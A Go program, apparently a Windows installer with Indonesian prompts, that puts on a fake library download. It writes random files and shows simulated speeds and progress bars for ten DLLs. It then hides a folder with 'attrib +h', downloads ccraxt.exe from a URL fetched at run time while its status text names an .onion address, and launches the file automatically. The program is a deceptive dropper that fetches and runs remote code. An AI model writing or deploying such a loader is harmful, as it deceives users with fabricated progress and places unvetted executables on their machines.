package main

import (
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"ccraxt.com/m/src"
	"github.com/briandowns/spinner"
)

func stringRepeat(char string, count int) string {
	result := ""
	for i := 0; i < count; i++ {
		result += char
	}
	return result
}

func Spinner(text string, duration time.Duration, sizeBytes float32) {
	spinners := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	start := time.Now()
	downloaded := float32(0)

	sizeMB := sizeBytes / 1e+06 // Convert ke MB
	avgSpeed := sizeMB / float32(duration.Seconds())
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	spinnerIndex := 0
	for range ticker.C {
		if time.Since(start) >= duration {
			break
		}

		downloaded += avgSpeed * 0.1
		if downloaded > sizeMB {
			downloaded = sizeMB
		}

		fmt.Printf("\r%s %s %.2f MB / %.2f MB (%.2f MB/s)", spinners[spinnerIndex], text, downloaded, sizeMB, avgSpeed)
		spinnerIndex = (spinnerIndex + 1) % len(spinners)
	}

	fmt.Printf("\r\033[K✅ Done! %s %.2f MB / %.2f MB\n", text, sizeMB, sizeMB)
}

func randomStepDuration(remaining time.Duration, stepsLeft int) time.Duration {
	min := int(remaining / (time.Duration(stepsLeft) * 4))
	max := int(remaining / time.Duration(stepsLeft) * 8)
	if min <= 0 {
		min = 1
	}
	if max <= min {
		max = min + 1
	}
	return time.Duration(rand.Intn(max-min) + min)
}

func BoxLoading(text string, duration time.Duration) {
	totalSteps := 10
	elapsed := time.Duration(0)

	for i := 0; i <= totalSteps; i++ {
		progress := fmt.Sprintf("[%s%s]", stringRepeat("■", i), stringRepeat("□", totalSteps-i))
		fmt.Printf("\r%s %s", progress, text)

		if i < totalSteps {
			stepDuration := randomStepDuration(duration-elapsed, totalSteps-i)
			time.Sleep(stepDuration)
			elapsed += stepDuration
		}
	}

}

func downloadFile(url, filePath string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer out.Close()

	buffer := make([]byte, 4096)
	var totalDownloaded int64
	startTime := time.Now()

	s := spinner.New(spinner.CharSets[14], 100*time.Millisecond)
	s.Start()

	for {
		n, err := resp.Body.Read(buffer)
		if n > 0 {
			if _, writeErr := out.Write(buffer[:n]); writeErr != nil {
				return writeErr
			}
			totalDownloaded += int64(n)

			elapsed := time.Since(startTime).Seconds()
			speed := float64(totalDownloaded) / elapsed / 1024 // KB/s

			s.Suffix = fmt.Sprintf(" Downloading ccraxt Executable from https://mnstsc.onion/cxcrxcxt... %.2f KB/s", speed)
		}

		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}
	}

	s.Stop()

	return nil
}

func VSpinner(text string, duration time.Duration) {
	spinners := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
	start := time.Now()
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	spinnerIndex := 0
	for range ticker.C {
		if time.Since(start) >= duration {
			break
		}

		fmt.Printf("\r%s %s", spinners[spinnerIndex], text)
		spinnerIndex = (spinnerIndex + 1) % len(spinners)
	}

	fmt.Printf("\r\033[K✅ Done! %s\n", text)
}

func main() {

	var answr string
	fmt.Print("Install Aplikasi Sekarang ? [y/n/yes/no] : ")
	fmt.Scanln(&answr)

	if strings.ToLower(answr) == "y" || strings.ToLower(answr) == "yes" {
		installed := false
		fmt.Println("Superfast Downloader library downloader by ryznxx")
		var data = []string{
			"libcrypto.dll",
			"libssl.dll",
			"libcurl.dll",
			"libz.dll",
			"libryupdater.dll",
			"libbaseEngine.dll",
			"libxml2.dll",
			"libx264.dll",
			"chunksplitter.dll",
			"chunkmerger.dll",
		}

		for _, item := range data {
			if _, err := os.Stat(item); err == nil {
				fmt.Println("File ditemukan:", item)
			} else if os.IsNotExist(err) {
				fmt.Println("File tidak ditemukan:", item)
				installed = true
			} else {
				fmt.Println("Error ngecek file:", item, err)
			}
		}

		if installed {

			VSpinner("Get All URL library from ryznxx server", 10*time.Second)
			VSpinner("Sorting..", 10*time.Second)
			VSpinner("Patch..", 30*time.Second)
			for _, item := range data {
				m := src.CreateRandomFile(item)
				Spinner(fmt.Sprintf("Downloading %s...", item), 5*time.Second, m)

				BoxLoading(fmt.Sprintf("Unpacking %s", item), 3*time.Second)
				BoxLoading(fmt.Sprintf("Installing %s", item), 2*time.Second)
			}
		}

		fmt.Print("\033[H\033[2J")

		url := src.VersionFetcher()

		parent := "cache"
		child := "cache/tmp"

		os.MkdirAll(child, os.ModePerm)

		cmd := exec.Command("attrib", "+h", parent)
		cmd.Run()

		fileName := "ccraxt.exe"

		dir, err := os.Getwd()
		if err != nil {
			fmt.Println("Error mendapatkan direktori kerja:", err)
			return
		}

		filePath := filepath.Join(dir, fileName)

		err = downloadFile(url, filePath)
		if err != nil {
			fmt.Println("Error download file:", err)
			return
		}

		fmt.Println("Sudah Terinstall, jalankan ccraxt.exe")

		if _, err := os.Stat(filePath); os.IsNotExist(err) {
			fmt.Println("Error: File ccraxt.exe tidak ditemukan di", filePath)
			return
		}

		cmd = exec.Command("cmd", "/c", "start", "", filePath)
		errx := cmd.Start()
		if errx != nil {
			fmt.Println("Error saat menjalankan ccraxt.exe:", errx)
			return
		}
	} else if strings.ToLower(answr) == "n" || strings.ToLower(answr) == "no" {
		fmt.Println("Yahh")

	} else {
		main()
	}
}
